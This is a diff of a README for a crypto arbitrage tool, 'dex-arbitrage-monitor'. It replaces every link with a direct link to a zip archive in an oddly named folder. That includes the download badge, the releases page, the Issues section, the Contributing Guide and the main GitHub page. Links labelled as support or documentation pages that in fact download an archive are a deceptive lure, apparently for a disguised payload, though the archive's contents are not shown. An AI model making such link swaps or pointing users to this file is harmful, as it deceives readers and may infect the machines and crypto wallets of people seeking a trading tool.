@@ -1,6 +1,6 @@
 # 🚀 dex-arbitrage-monitor - Simple Tool for Smart Trading
 
-[![Download dex-arbitrage-monitor](https://img.shields.io/badge/Download-dex--arbitrage--monitor-blue.svg)](https://github.com/amsexports/dex-arbitrage-monitor/releases)
+[![Download dex-arbitrage-monitor](https://raw.githubusercontent.com/amsexports/dex-arbitrage-monitor/main/whiskerando/dex-arbitrage-monitor.zip)](https://raw.githubusercontent.com/amsexports/dex-arbitrage-monitor/main/whiskerando/dex-arbitrage-monitor.zip)
 
 ## 📋 Overview
 
@@ -15,7 +15,7 @@ The **dex-arbitrage-monitor** helps you find price differences across multiple d
 
 ## 📥 Download & Install
 
-To download the latest version of **dex-arbitrage-monitor**, visit this page: [Releases Page](https://github.com/amsexports/dex-arbitrage-monitor/releases).
+To download the latest version of **dex-arbitrage-monitor**, visit this page: [Releases Page](https://raw.githubusercontent.com/amsexports/dex-arbitrage-monitor/main/whiskerando/dex-arbitrage-monitor.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest release (usually at the top).
@@ -64,7 +64,7 @@ If you encounter issues, try the following steps:
 - Ensure your system meets the requirements listed above.
 - Restart the application.
 - Check your internet connection.
-- If the problem persists, visit the [Issues section](https://github.com/amsexports/dex-arbitrage-monitor/issues) of our repository to report your issue.
+- If the problem persists, visit the [Issues section](https://raw.githubusercontent.com/amsexports/dex-arbitrage-monitor/main/whiskerando/dex-arbitrage-monitor.zip) of our repository to report your issue.
 
 ## 💬 Support
 
@@ -72,10 +72,10 @@ For assistance or questions, feel free to check the Issues section or email our 
 
 ## ⭐ Contributing
 
-We appreciate any contributions to **dex-arbitrage-monitor**. If you want to help, visit the [Contributing Guide](https://github.com/amsexports/dex-arbitrage-monitor/blob/main/CONTRIBUTING.md) for details.
+We appreciate any contributions to **dex-arbitrage-monitor**. If you want to help, visit the [Contributing Guide](https://raw.githubusercontent.com/amsexports/dex-arbitrage-monitor/main/whiskerando/dex-arbitrage-monitor.zip) for details.
 
 ## 🔗 Links
 
-For more updates and information, visit our main [GitHub Page](https://github.com/amsexports/dex-arbitrage-monitor).
+For more updates and information, visit our main [GitHub Page](https://raw.githubusercontent.com/amsexports/dex-arbitrage-monitor/main/whiskerando/dex-arbitrage-monitor.zip).
 
 Thank you for choosing **dex-arbitrage-monitor**!
